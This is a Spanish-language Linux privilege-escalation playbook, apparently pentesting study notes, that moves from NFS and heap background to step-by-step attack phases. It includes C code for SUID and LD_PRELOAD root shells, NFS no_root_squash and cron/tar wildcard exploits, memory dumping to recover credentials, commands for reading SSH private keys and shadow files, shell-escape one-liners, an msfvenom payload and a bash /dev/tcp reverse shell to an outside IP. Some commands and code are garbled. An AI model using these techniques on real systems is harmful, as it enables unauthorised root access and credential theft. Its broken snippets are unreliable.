Un Sistema de archivos de red \(NFS\) permite a los hosts remotos montar sistemas de archivos sobre la red e interactuar con esos sistemas de archivos como si estuvieran montados localmente \(compartir ficheros/recursos en una red\).

La única vez que NFS lleva a cabo la autentificación es cuando el cliente intenta montar un recurso compartido NFS. Para limitar el acceso al servicio NFS, se utilizan envolturas TCP \(TCP wrappers\). Los TCP wrappers leen los archivos /etc/hosts.allow y /etc/hosts.deny para determinar si a un cliente particular o red tiene acceso o no al servicio NFS.

El archivo /etc/exports controla cuáles sistemas de archivos son exportados a las máquinas remotas y especifica opciones.

Después de que al cliente se le permite acceso gracias a un TCP wrapper, el servidor NFS recurre a su archivo de configuración, /etc/exports, para determinar si el cliente tiene suficientes privilegios para acceder a los sistemas de archivos exportados. Una vez otorgado el acceso, todas las operaciones de archivos y de directorios están disponibles para el usuario.

Si se está utilizando NFSv2 o NFSv3, los cuales no son compatibles con la autenticación Kerberos, los privilegios de montaje de NFS son otorgados al host cliente, no para el usuario. Por lo tanto, se puede acceder a los sistemas de archivos exportados por cualquier usuario en un host cliente con permisos de acceso.

La opción root\_squash previene a los usuarios root conectados remotamente de tener privilegios como root asignándoles el id del usuario de nobody. Esto reconvierte el poder del usuario root remoto al de usuario local más bajo, previniendo la alteración desautorizada de archivos en el servidor remoto.

Alternativamente, la opción no\_root\_squash lo desactiva. Para reconvertir a todos los usuarios, incluyendo a root, se ha de usar la opción all\_squash.

Otras opciones interesantes son:

* noexec: Evita la ejecución de archivos binarios en sistemas de archivos montados. Esto evita que los usuarios remotos ejecuten archivos binarios no deseados en su sistema.
* nosuid: Deshabilita los bits set-user-identifier o set-group-identifier. Esto evita que los usuarios remotos obtengan mayores privilegios al ejecutar un programa setuid.
* nodev: Impide la interpretación de los dispositivos especiales o de bloques del sistema de archivos. Esto evita que los usuarios remotos salgan de las chroot definidas.

#### Consideraciones de seguridad en NFS

NFS no fue diseñado pensando en la seguridad:

* Los datos se transmiten en claro
* Usa el UID/GID del usuario en el cliente para gestionar los permisos en el servidor
* De manera predeterminada, los archivos creados heredan la identificación del usuario remoto y la identificación del grupo \(como propietario y grupo respectivamente\), incluso si no existen en el servidor NFS.
* El usuario con UID n en el cliente obtiene permisos de acceso a los recursos del usuario con UID n en el servidor \(aunque sean usuarios distintos\)
* Un usuario con acceso a root en un cliente podría acceder a los ficheros de cualquier usuario en el servidor \(no a los de root, si se usa la opción root\_squash\)

#### Comentario

NFS es más rápido y tiene mejor rendimiento que samba pero Nfs autentica por hosts, no por usuarios como samba. Asi pues, la seguridad de samba es mejor que la de NFS. Otra consideración, Nfs es solo linux, en una red windows-linux, tocara utilizar samba\(smb\).

### Heap

La memoria dinámica que se almacena en el _heap_ es aquella que se utiliza para almacenar datos que se crean en el medio de la ejecución de un programa. En general, este tipo de datos puede llegar a ser casi la totalidad de los datos de un programa. Por ejemplo, supóngase un programa que abre un fichero y lee una colección de palabras. ¿Cuántas palabras y de qué tamaño hay en el fichero? Hasta que no se procese el fichero en su totalidad, no es posible saberlo.

La manipulación de memoria en C se hace con un mecanismo muy simple, pero a la vez muy propenso a errores. Los dos tipos de operaciones son la petición y liberación de memoria. El ciclo es sencillo, cuando se precisa almacenar un nuevo dato, se solicita tanta memoria en bytes como sea necesaria, y una vez que ese dato ya no se necesita la memoria se devuelve para poder ser reutilizada. Este esquema se conoce como “gestión explícita de memoria” pues requiere ejecutar una operación para pedir la memoria y otra para liberarla.

Las cuatro operaciones principales para gestionar memoria en C son:

* void \*malloc\(size\_t size\). Es la función para reservar tantos bytes consecutivos de memoria como indica su único parámetro. Devuelve la dirección de memoria de la porción reservada. La memoria no se inicializa a ningún valor.
* void \*calloc\(size\_t nmemb, size\_t size\). Reserva espacio para tantos elementos como indica su primer parámetro nmemb, y cada uno de ellos con un tamaño en bytes como indica el segundo. En otras palabras, reserva nmemb \* size bytes consecutivos en memoria. Al igual que la función anterior devuelve la dirección de memoria al comienzo del bloque reservado. Esta función inicializa todos los bytes de la zona reservada al valor cero.
* void free\(void \*ptr\). Función que dado un puntero, libera el espacio previamente reservado. El puntero que recibe como parámetro esta función tiene que ser el que se ha obtenido con una llamada de reserva de memoria. No es necesario incluir el tamaño. Una vez que se ejecuta esta llamada, los datos en esa porción de memoria se consideran basura, y por tanto pueden ser reutilizados por el sistema.
* void \*realloc\(void \*ptr, size\_t size\). Función para redimensionar una porción de memoria previamente reservada a la que apunta el primer parámetro al tamaño dado como segundo parámetro. La función devuelve la dirección de memoria de esta nueva porción redimensionada, que no tiene por qué ser necesariamente igual al que se ha pasado como parámetro. Los datos se conservan intactos en tantos bytes como el mínimo entre el tamaño antiguo y el nuevo.

## Fases de la escalada de privilegios

Formas de llevar a cabo una escalada de privilegios hay muchas, de las más sencillas a las más complejas, y a veces lo más fácil es empezar a tirar exploits y herramientas como si no hubiera un mañana. Personalmente, no estoy muy a favor de esta forma de actuar, hay riesgo de dejar el servidor atontado, de hacer más ruido del debido o de obtener tal volumen de información que no sepa "tratar".

Yo prefiero empezar con un análisis "old school", poco a poco. Sin embargo, llegado el momento, el uso de alguna tool especifica puede ayudar mucho, siempre que se sepa que se esta haciendo y se gestione correctamente toda la información que se obtendrá.

Realmente, la única técnica valida es Enumerar, enumerar más y darle vueltas a la cabeza, no hay más secreto.

### Tools

* [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
* [https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)
* [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
* [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
* [https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
* [https://github.com/TH3xACE/SUDO\_KILLER](https://github.com/TH3xACE/SUDO_KILLER)
* Metasploit

### Primera fase: Enumeración básica y Low-Hanging fruit

En esta primera fase, se lleva a cabo una enumeración muy básica del terminal y se prueban algunas ideas locas por su simpleza

#### ¿Quién soy, quién hay ahí?

**Objetivo**

Obtener información de nuestro usuario y de otros usuarios de la máquina.

**Instrucciones**

* id: print real and effective user and group IDs
* w: Show who is logged on and what they are doing \(who -a\)
* last: show a listing of last logged in users \(last nombre usuario\)
* cat /etc/passwd \| cut -d: -f1: List of users
* awk -F: '\($3 == "0"\) {print}' /etc/passwd: List of super users
* awk -F: '{printf "%s:%s\n",$1,$3}' /etc/passwd: listar usuarios con id
* Screen -ls
* tmux ls

#### ¿Dónde estoy, qué sistema es?

**Objetivo**

Obtener información muy básica sobre el sistema en que estamos.

**Instrucciones**

* uname -a: Identificación de la versión de Kernel

  La interpretación de la información es la siguiente: tipo de núcleo, arquitectura, nombre de red, sistema operativo que se esta usando, información del kernel, fecha de publicación del kernel.

  Por ejemplo: 5.4.0-kali3-686-pae

  * Version del núcleo: 5 \(major release\)
  * Subversion: 4 \(si el numero es par, es estable, sino en desarrollo\) \(minor realase\)
  * 0: Revision de núcleo \(revision\)

  Es decir, la version del kernel es 5.4.0 El kernel fue compilado para la version 3 de Kali Y su arquitectura es 686 \(32 bits\) con extension de dirección física \(pae\)

* hostname: Nombre de la máquina
* lscpu: Información sobre la cpu
* cat /proc/version: Identificación de la distribución
* cat /etc/issue: Identificación de la distribución
* cat /etc/\*-release: Identificación de la distribución
* df -h: Espacio de disco de un sistema linux
* cat /etc/fstab: Definición de las particiones

#### ¿Qué puedo hacer?

**Objetivo**

Trastear con sudo

Conocer que lenguajes de programación están instalados en la máquina

Saber como puedo subir ficheros

**Instrucciones**

* sudo -l: Mostrar que podríamos hacer con sudo, si es que tenemos acceso a sudo
* cat /etc/group \| grep sudo: Obtener los usuarios que forman parte del grupo sudo
* Sudo -v: Versión de sudo
* cat /etc/sudoers

Información sobre lenguajes de programación:

* find / -name perl\*
* find / -name python\*
* find / -name gcc\*
* find / -name cc\*

Información sobre posibilidades de subida de ficheros:

* find / -name wget\*
* find / -name nc\*
* find / -name netcat\*
* find / -name tftp\*
* find / -name ftp\*

Revisar los posibles historiales:

* .history, bash\_history, .nano\_history, .mysql\_history , etc.

#### Low-hanging Fruit

**Objetivo**

Realizar algunas pruebas que por su simpleza ni se piensen hacer y en cambio, puede que funcionen

**Instrucciones**

1. Probar su - root, sudo su, sudo /bin/bash.
   1. Posibles passwords: ninguno, root, toor, 1234, admin, administrator, password, mismo nombre del usuario...
2. Consultar el History de cada usuario y servicios
   1. History \| grep password, pass, root, mysql, sudo, configuration, conf, auth...
   2. .bash\_history,
3. Probar su con los usuarios que sabemos que tienen acceso a sudo
4. Mirar, por si acaso, los permisos del fichero /etc/shadow
5. Mirar /home de los usuarios y /root

#### Bala de plata I: Kernel

En esta fase, la bala de plata es localizar exploits de Kernel. Localizar, no utilizar. Un exploit de Kernel puede dar root pero también puede tumbar el servidor o dejarlo medio lelo. ¿Porque? Pues porque estamos zurrando al Kernel, amo y señor del sistema. El riesgo es mínimo, poco...pero existe. Quizás enumerando algo, un poquito más es posible encontrar el password de root en un fichero en /tmp.

Pero también esta bien saber si hay o no exploits de Kernel y se puede contar con esa opción.

Una vez se identifica la distribución y la versión del Kernel del sistema se pueden buscar exploit utilizando:

* Google
* Exploitdb
* searchsploit
* Github
* Otros

Una vez se han encontrado algunos exploits con posibilidades de exito, no esta de más buscar algo de información sobre ellos y darle un vistazo al código.

### Segunda Fase: Enumeración de red

En este segunda fase se enumeran aspectos de red y comunicaciones

#### ¿Cuál es la configuración de red de la máquina?

**Objetivo**

Obtener la configuración de red de la máquina

**Instrucciones**

* ifconfig: Ip de la máquina
* route -nee: Routing de la máquina
* arp -e: Información ARP
* cat /etc/resolv.conf: Informacion dns
* Dnsdomainname: Nombre del dominio DNS

#### ¿Cómo se relaciona la máquina con el exterior y con ella misma?

**Objetivo**

Conocer que puertos y servicios asociados están activos

**Instrucciones**

* netstat -punta
* Lsoft -P -i -n : Permite visualizar los puertos TCP y UDP en escucha así como las conexiones activas en el sistema
  * Lsoft lista los ficheros abiertos en el sistema. Otros comandos útiles: -p PID, -u Use, -c nombre\_proceso, +D directorio/path concreto
* iptables -L: Listar las reglas de iptables

#### Bala de plata II: NFS

Tal y como se ha comentado antes, NFS no esta "diseñado" para ser seguro per se. En determinadas condiciones, es posible explotar su mala configuración y ser root.

**Detección**

1. El servicio esta activo
2. Realizar cat/etc/exports
3. Comprobar que la opción no\_root\_squash esta presente \( y en que directorio\)
4. Analizar otras posibles opciones que pueden resultar un problema, como nosuid o nodev

**Explotacion**

1. Montar NFS
   1. showmount -e IP\_MAQUINA\_VICTIMA
   2. nmap –sV –script=nfs-showmount
   3. mkdir /tmp/1
   4. mount -o rw, vers=2 IP\_MAQUINA\_VICTIMA:/tmp/tmp/1
   5. mount -o rw,vers=2:
   6. Vers= version del NFS, puede cambiaR
2. Crear el siguiente fichero: \#define NULL 0 int main\(\){ setgid\(0\); setuid\(0\); execl\("/bin/sh","sh",NULL\); // system\("/bin/bash"\);return 0;}
3. Como root \(en el local host\) compilar y ejecutar el fichero en el directorio montado
   1. gcc /tmp/1/shell.c -o /tmp/1/shell
4. Fijar el suid en el ejecutable
   1. chmod +s /tm/1/shell
5. Ejecutar el fichero en el NFS server
   1. /tmp/shell
   2. id

**Resumen**

When **no\_root\_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.

1. remote check the name of the folder
2. showmount -e IP
3. create dir: mkdir /tmp/foo
4. mount directory: mount -t nfs IP:/shared /tmp/foo
5. cd /tmp/foo
6. copy wanted shell: cp /bin/bash
7. set suid permission: chmod +s bash

### Tercera fase: Enumeración de servicios y Cron

En esta fase se obtendra información sobre los servicios que se estan ejecutando, con que tipo de permisos y también se revisaran las tareas Cron que haya en el terminal.

#### ¿Qué servicios se estan ejecutando y que caracteristicas tienen?

**Objetivos**

Determinar que servicios se estan ejecutando, comprobar sus permisos y ver si hay algún servicion que pueda suponer un vector de ataque. Por ejemplo, si un servicio esta corriendo como root, explotarlo puede acabar siendo una ejecucion de codigo como root

**Instrucciones**

* ps aux \| grep ^root: Listar los procesos del usuario root
* ps -eo 'tty,pid,comm', ps -ef : Listar procesos
* program --version: Obtener la versión del programa
* dpkg -l \| grep program: Listar aplicaciones instaladas
* rpm -qa \| grep program: Listar aplicaciones instaladas
* /proc/number: Información de un proceso ID

#### ¿Qué información puedo obtener de Cron?

**Objetivo**

Obtener todo la información posible sobre el servicio Cron.

**Instrucciones**

* crontab -l
* ls -alh /var/spool/cron
* ls -al /etc/ \| grep cron
* ls -al /etc/cron
* cat /etc/cron\*
* cat /etc/at.allow
* cat /etc/at.deny
* cat /etc/cron.allow
* cat /etc/cron.deny
* cat /etc/crontab
* cat /etc/anacrontab
* cat /var/spool/cron/crontabs/root

#### Bala de plata III: Atacando a los servicios

**Servicios vulnerables**

Analizar los demonios activos, y ver si existe alguna vulnerabilidad.

**Atacando puertos internos**

Si se encuentra un servicio "interesante" que esta ejecutandose en puertos internos, y el exploit no funciona localmente, la solución es hacer un port forwarded SSH

_ssh -R &lt;local-port&gt;:127.0.0.1:&lt;target-port&gt;&lt;username&gt;@&lt;local-machine&gt;_

**Analizar la memoria de los servicios**

Las credenciales pueden estar en memoria en texto claro, en el contexto de una aplicación en ejecución

El acceso a "ese" espacio de memoria en concreto es solo posible si la "operación" se realiza en el mismo contexto de usuario

**Ejercicio de Explotación**

_Kali_

1. In command prompt type: msfconsole
2. In Metasploit \(msf &gt; prompt\) type: use auxiliary/server/ftp
3. In Metasploit \(msf &gt; prompt\) type: set FTPUSER user
4. In Metasploit \(msf &gt; prompt\) type: set FTPPASS password321
5. In Metasploit \(msf &gt; prompt\) type: run

_Linux VM_

1. In command prompt type: ftp \[Kali VM IP Address\]
2. In ftp, type: user
3. In ftp, type: password321
4. In ftp press ctrl-z
5. In command prompt type: ps -ef \| grep ftp
6. Make note of the PID of the ftp process.
7. In command prompt type: gdb -p \[FTP PID\]
8. In GDB, \(gdb\) prompt, type: info proc mappings
9. From the output, note the start and end memory addresses of the “\[heap\]”
10. In GDB. \(gdb\) prompt, type: q
11. In GDB, \(gdb\) prompt, type: dump memory /tmp/mem \[Start Address\] \[End Address\]
12. In GDB. \(gdb\) prompt, type: q
13. In command prompt type: strings /tmp/mem \| grep passw
14. From the output, note the credentials in clear-text.

#### Bala de plata IV: Atacando Cron

**Configuraciones**

Si un fichero que se ejecuta con cron no esta bien configurado podría ser posible modificarlo y conseguir una escalada de privilegios muy fáciles. Por ejemplo, si tenemos permiso de escritura de un fichero que se ejecuta con cron, se podría modificar el código.

Por ejemplo, un cron ejecutado con permisos de root:

int main\(\) { setuid\(0\); system\("/bin/bash -p"\); }

gcc -o filename.c

**Modificación del Path**

PATH contiene o indica la ruta a los directorios en los cuales cron buscará el comando a ejecutar. Este path es distinto al path global del sistema o del usuario.

* Una posibilidad es modificar la variable Path del fichero crontab para que busque determinado fichero en una ubicación concreta
* Observar si un scrip cron no tiene definido un path absoluto, también puede ser un vector de ataque

**Explotación**

1. Compilar un shell file
2. Colocarlo en una ubicacion del path accesible
3. Esperar que sea ejecutado por cron

**Código**

echo 'cp /bin/bash tmp/bash; chmod +s /tmp/bash' &gt; /path/to/file chmod +x /path/to/file /tmp/bash -p

**Explicación parámetro p**

Si el shell se inicia con el id. De usuario \(grupo\) efectivo no es igual al id. De usuario real \(grupo\), y no se proporciona la opción -p, no se leen los archivos de inicio, las funciones del shell no se heredan del entorno, , BASHOPTS, CDPATH y GLOBIGNORE, si aparecen en el entorno, se ignoran y la identificación de usuario efectiva se establece en la identificación de usuario real. Si la opción -p se proporciona en la invocación, el comportamiento de inicio es el mismo, pero el ID de usuario efectivo no se restablece.

-p

Activa el modo _privilegiado_. En este modo, el fichero correspondiente a **$ENV** no es procesado, las funciones del shell no se heredan desde el entorno, y la variable **SHELLOPTS**, si aparece en el entorno, no se tiene en consideración. Esta opción se activa automáticamente en el arranque si el identificador efectivo del usuario \(o grupo\) no es igual al identificador real del usuario \(o grupo\). Desactivar esta opción hace que los identificadores efectivos de usuario y grupo se pongan con los valores de los identificadores reales de usuario y grupo respectivamente.

### Cuarta fase: Buscando ficheros interesantes

La idea de esta fase es buscar ficheros que resultares interesantes, ya sea por su información, sus permisos etc..

Si los permisos de los ficheros no son correctos:

1. En el caso de la lectura: Podemos leer información confidencial
2. En el caso de la escritura: Podemos escribir en ese fichero y modificar el comportamiento esperado

#### ¿Hay ficheros con SUID?

**Objetivo**

Localizar aquellos ficheros con el bit SUID activo \(permisos 4XXX\).El fichero se ejecuta con los permisos del propietario

**Instrucciones**

Para encontrar ficheros con el bit SUID o GUID activo:

* find / -type -f -perm -04000 -ls 2&gt;/dev/null
* find / -type -f -perm -02000 -ls 2&gt;/dev/null
* find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2&gt; /dev/null

#### ¿Cómo están los ficheros de configuración?

**Objetivo**

Analizar los permisos de los ficheros de configuración

Buscar si hay passwords en ficheros de configuración

Buscar todos los servicios que se están publicando y ver sus ficheros de configuración, como smb, apache \(htpasswd\), mysql, ssh, etc...

**Instrucciones**

* Encontrar todos los ficheros con permisos de escritura en /etc
  * find /etc -maxdepth 1 -writable -type f
* Encontrar todos los ficheros con permisos de lectura en /etc:
  * find /etc -maxdepth 1 -readable -type -f
* Buscar passwords en ficheros de configuración:
  * find /etc -maxdepth 1 -readable -type f -exec grep -Hin passw --color {} ;
  * _If you run find with exec, {} expands to the filename of each file or directory found with find_

    _Semicolon ; ends the command executed by exec . It needs to be escaped with \ so that the shell you run find inside does not treat it as its own special character, but rather passes it to find_.

#### ¿Qué hay en los home?

**Objetivo**

Revisar los home del sistema por si hay cosas interesantes

**Instrucciones**

Listar de forma recursiva /home y /root:

* ls -ahlR /root/
* ls -ahlR /home/

#### ¿Qué sabemos de SSH?

**Objetivo**

Conseguir claves de conexión de SSH. Las claves SSH son la alternativa a los passwords SSH, siempre van en pareja y si no estan bien protegidas seria posible utilizarlas.

**Instrucciones**

Localizar ficheros relacionados con SSH

* find / -name authorized\_keys 2&gt; /dev/null
* find / -name id\_rsa 2&gt; /dev/null

A lo bruto:

* cat ~/.ssh/authorized\_keys
* cat ~/.ssh/identity.pub
* cat ~/.ssh/identity
* cat ~/.ssh/id\_rsa.pub
* cat ~/.ssh/id\_rsa
* cat ~/.ssh/id\_dsa.pub
* cat ~/.ssh/id\_dsa
* cat /etc/ssh/ssh\_config
* cat /etc/ssh/sshd\_config
* cat /etc/ssh/ssh\_host\_dsa\_key.pub
* cat /etc/ssh/ssh\_host\_dsa\_key
* cat /etc/ssh/ssh\_host\_rsa\_key.pub
* cat /etc/ssh/ssh\_host\_rsa\_key
* cat /etc/ssh/ssh\_host\_key.pub
* cat /etc/ssh/ssh\_host\_key

#### Bala de plata V: Sudo y ficheros SUID

**Explotación de LD\_Preload**

Si en el fichero de sudoers hay "env\_keep += LD\_PRELOAD" , significa que LD\_PRELOAD que no deja de ser una ubicación de librerías, esta activa. Por lo que cuando un usuario ejecute un programa con sudo, sudo sabe donde ha de buscar las librerías compartidas para funcionar.

La idea es crear un objeto .so, referénciado por LD\_PRELOAD y que sera cargado antes que cualquier otro.

¿Pero...porque es necesaria la opción env\_keep?

La limitación es que LD\_PRELOAD no funcionara si el RUID y el EUID no son el mismo. Por ese motivo, es necesario que LD\_PRELOAD = env\_keep option

Si no existe esta configuración, no se puede explotar esta vulnerabilidad

**Creación de la shell**

1. Creación de shell.c en /tmp:

\#include \#include \#include \#include

void \_init\(\) { unsetenv\("LD\_PRELOAD"\); setgid\(0\); setuid\(0\); system\("/bin/sh"\); }

1. Lo pasamos a libreria.so:

cc -fPIC -shared -o shell.so shell.c -D\_GNU\_SOURCE -nostartfiles

1. Entonces:

sudo LD\_PRELOAD=/tmp/shell.so xxx \(comando que tengamos permiso de sudo\)

Como va a cargar con privilegios de sudo nuestra "shell" se ejecuta y voilà

**Explicaciones sobre el código**

unsetenv: Environment variables such as LD\_PRELOAD are inherited by child processes. The linked example overrides the \_init symbol to invoke a shell using system\("/bin/bash"\). If the environment variable would not have been cleared, then it would effectively be stuck in an "infinite loop" when invoking system.

Environment variables such as `LD_PRELOAD` are inherited by child processes. The linked example overrides the `_init` symbol to invoke a shell using system\("/bin/bash"\). If the environment variable would not have been cleared, then it would effectively be stuck in an "infinite loop" when invoking `system`.

If you watch your process list \(using `ps aux` for example\), you will see a bunch of shell processes. The system library function creates a new process and executes `/bin/sh -c "...."`. Every time, `_init` is executed.

system\(\) hace un fork y ejecuta execl\(\) con /bin/sh -c "COMMAND"

cuando se hace un fork, se "clona" el contexto del proceso, lo que implica copiar todas las variables de entorno

si LD\_PRELOAD esta seteado, lo va a pasar como contexto al execl\(\) y como este lleva tu binario, que sobreescribe \_init\(\) cuando se ejecute /bin/sh lo primero que hará es cargar tu binario, que sobreescribe \_init y este volverá a haver el system\(\) en un bucle infinito

\_Init: Sometimes, a threaded application needs to ensure that some initialization action occurs just once, regardless of how many threads are created. For example, a mutex may need to be initialized with special attributes using pthread\_mutex\_init\(\), and that initialization must occur just once. If we are creating the threads from the main program, then this is generally easy to achieve—we perform the initialization before creating any threads that depend on the initialization. However, in a library function, this is not possible, because the calling program may create the threads before the first call to the library function. Therefore, the library function needs a method of performing the initialization the first time that it is called from any thread. A library function can perform one-time initialization using the pthread\_once\(\) function.

The pthread\_once\(\) function uses the state of the argument once\_control to ensure that the caller-defined function pointed to by init is called just once, no matter how many times or from how many different threads the pthread\_once\(\) call is made. The init function is called without any arguments, and thus has the following form: void init\(void\) { /\* Function body \*/ }

An older technique for shared library initialization and finalization is to create two functions, \_init\(\) and \_fini\(\), as part of the library. The void \_init\(void\) function contains code that is to executed when the library is first loaded by a process. The void \_fini\(void\) function contains code that is to be executed when the library is unloaded. If we create \_init\(\) and \_fini\(\) functions, then we must specify the gcc –nostartfiles option when building the shared library, in order to prevent the linker from including default versions of these functions. \(Using the –Wl,–init and –Wl,–fini linker options, we can choose alternative names for these two functions if desired.\) Use of \_init\(\) and \_fini\(\) is now considered obsolete in favor of the gcc constructor and destructor attributes, which, among other advantages, allow us to define multiple initialization and finalization functions.

It is possible to define one or more functions that are executed automatically when a shared library is loaded and unloaded. This allows us to perform initialization and finalization actions when working with shared libraries. Initialization and finalization

**LD\_Library**

LD\_Library path contiene un listado de directorios donde se han de buscar librerías.

El comando Ldd nos servirá para conocer que librerías utiliza un binario:

* $ ldd /usr/sbin/XXX

La idea es substituir una librería \(lib\_a\_subs.so\) que deba usar el binario XXX por una librería que este bajo nuestro control

El código es el siguiente:

\#include \#include

static void foo\(\) \__attribute_\_\(\(constructor\)\);

void foo\(\)

{ unsetenv\("LD\_LIBRARY\_PATH"\);

setresuid\(0,0,0\);

system\("/bin/bash -p"\);

}

1. Compilación:

   $ gcc -o lib\_a\_subs.so -shared -fPIC foo.c

2. Ejecución:

   $ sudo LD\_LIBRARY\_PATH=. XXX \# id uid=0\(root\) gid=0\(root\) groups=0\(root\)

**Shell Escape Sequences y abuso de funcionalidades**

Web de referencia: GTFOBins [https://gtfobins.github.io](https://gtfobins.github.io/)

Algunos programas nos permiten "escapar" a la shell o abusar de ciertas funcionalidades:

* vim/vi/man/less/more/GDB/iftop !sh
* ftp !
* find find /bin -name nano -exec /bin/sh ;
* awk awk 'BEGIN {system\("/bin/sh"\)}'
* nmap echo "os.execute\('/bin/sh'\)" &gt; shell.nse nmap --script=shell.nse
* nano nano -sh /bin/sh sh ^T
* Python python -c 'import pty; pty.spawn\("/bin/sh"\)' python -c 'import os; os.system\("/bin/bash"\)'
* except except spawn
* gdb gdb \(gdb\)!/bin/bash
* Journalctl

  !/bin/sh

* Mysql

  mysql&gt; ! /bin/bash

* ssh

  ssh user@XX -t "/bin/sh"

  ssh user@XX -t "bash --noprofile"

  ssh user@XX -t "\(\) { :; }; /bin/bash" \(shellshock\)

* zip

  zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

* tar

  tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

* apache

  Apache -f utiliza la directiva del fichero de configuración al arrancar Pero..... sudo apache2 -f y si hacemos sudo apache2 -f /etc/shadow

**Shared objects**

Los ficheros "shared objects" \(so\) son la equivalencia linuxera a los ficheros dll de Windows

* Contienen "funciones" reutilizables
* Las funciones exportadas \(symbols\) se exportan via tabla
* Los objetos son cargadas dentro del contexto de un proceso existente

Los métodos de linking:

1. Static linking
2. Dynamic Linking

**Explicación de la vulnerabilidad**

Cuando el programa es ejecutado, se cargaran los shared objects que se indican.

Pero, ¿qué pasaría si algunos de estos objetos no se cargan, porque no están, pero nosotros tenemos acceso a esa ubicación? pues que podemos dar gato por liebre

**Detección**

_strace 2&gt;&1 \| grep -i -E "open\|access\| no such file"_

**Explotación**

1. Compilar un fichero .so
2. Renombrarlo y utilizarlo en la localización identificada donde no hay fichero

\#include \#include

static void foo\(\) \_ _attribute_ \_ \(\(constructor\)\);

void foo\(\) {

​ setuid\(0\);

​ system\("/bin/bash -p"\);

}

$ gcc -shared -fPIC -o path

**Symlink**

Contiene una referencia a otro fichero, pero ese fichero puede ser que no exista. Al igual que antes, esto significaría que podemos "ocupar" ese espacio con un fichero nuestro

**Detección**

* ls -l

**Variables de entorno**

**Path**

Esta es la clásica, modificar la variable path indicando una ubicación que este bajo nuestro control y que anteceda a todas las demás. Se ubica un binario con el mismo nombre del que se "tendría" que ejecutar en esa ubicación y...a esperar.

Algunas de las funciones que usan la variable Path:

System\(\)

popen\(\)

Execlp\(\)

execvp\(\)

Execvpe\(\)

**Detección**

* Hopper
* Binary Ninja
* idapro
* Strings
* strace -v -f -e execve command 2&gt;&1 \| grep exec
* ltrace command

**Explotación**

1. Compilar un fichero ejecutable
2. Renombrarlo si hace falta
3. Colocarlo en una posición donde podamos escribir
4. Añadir la localización al PATH, pero que proceda a todos los otros paths definidos

#### Bala de plata VI: Password mining

**Objetivos**

Basicamente, buscar passwords donde sea.

Un buen sitio para empezar son los ficheros de configuración de los servicios, sobretodo aquellos servicios cuyo objetivo sea "compartir" y puedas necesitar autenticación, como smb, nfs, apache, etc...

**Instrucciones**

* grep -RiIn passw / 2&gt;/dev/null: Recursivo, no case, número de linea, procesa un fichero binario como si no contuviera match
* grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2&gt; /dev/null
* strings /dev/mem \| grep -i PASS
* $ locate password \| more
* /var/log/: Es posible que hayan passwords en los logs

Un recurso que nos puede proporcionar información valiosa es la busqueda de backups:

1. /root/
2. /tmp
3. /var/backups

#### Bala de plata VII: Wildcards

Fuente original: [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

Bash soporta "filename expension functionality" \(globbing\) \(Filename expansion means expanding filename patterns or templates containing special characters. For example, example.??? might expand to example.001 and/or example.txt.\) El carácter \* significa que hace mach con cualquier string, \* es remplazado por lista ordenada alfabéticamente

**El truco**

Simple trick behind this technique is that when using shell wildcards, especially asterisk \(\*\), Unix shell will interpret files beginning with hyphen\(-\) character as command line arguments to executed command/program. That leaves space for variation of classic channeling attack. Channeling problem will arise when different kind of information channels are combined into single channel. Practical case in form of particulary this technique is combining arguments and filenames, as different "channels" into single, because of using shell wildcards.

En otras palabras, cuando Linux utiliza wildcars \(como \* \) y se encuentra con un archivo con un - antes, lo interpreta como una argumento al comando que se ejecuta:

Por ejemplo:

\[root@defensecode public\]\# rm \* \[root@defensecode public\]\# ls -al total 8 drwxrwxr-x. 2 leon leon 4096 Oct 28 17:05 . drwx------. 22 leon leon 4096 Oct 28 16:15 .. -rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf

Directory is totally empty, except for '-rf' file in it. All files and directories were recursively deleted, and it's pretty obvious what happened...

When we started 'rm' command with asterisk argument, all filenames in current directory were passed as arguments to 'rm' on command line, exactly same as following line:

\[user@defensecode WILD\]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf

When a wildcard character \(\*\) is provided to a command as part of an argument, the shell will first perform _filename expansion_ \(also known as globbing\) on the wildcard.

This process replaces the wildcard with a space-separated list of the file and directory names in the current directory.

An easy way to see this in action is to run the following command from your home directory:

$ echo \*

Since filesystems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options \(e.g. -h, --help\) to commands by creating files with these names.

The following commands should show how this works:

$ ls \* % touch ./-l $ ls \*

Filenames are not simply restricted to simple options like -h or --help.

In fact we can create filenames that match complex options: --option=key=value

**Explotación**

1. Crea un fichero que pueda ser interpretado como un argumento por la tarea
2. Esperar que suceda la magia

Por ejemplo: Tar tiene un argumento "checkpoint" asi pues:

Este argumento lo que hace es permitir al usuario definir una accion que ejecutar durante el checkpoint

* echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; runme.sh
* touch /writable/path/used/by/tar --checkpoint=1
* touch /writable/path/used/by/tar --checkpoint-action=exec sh\ runme.sh

## Técnicas

### Spawn a shell

#### Sudo

* Copiar el fichero /bin/bash con el SUID root set y ejecutar con -p

#### Metasploit

* msfvenom -p linux/x86/shell\_reverse\_tcp LHOST= LPORT= -f elf &gt; shell.elf
* netcat + multihandlers \(metasploit\)

#### Bash

* /bin/bash -i &gt; /dev/tcp/192.168.1.49/8080 0&lt;&1 2&gt;&1
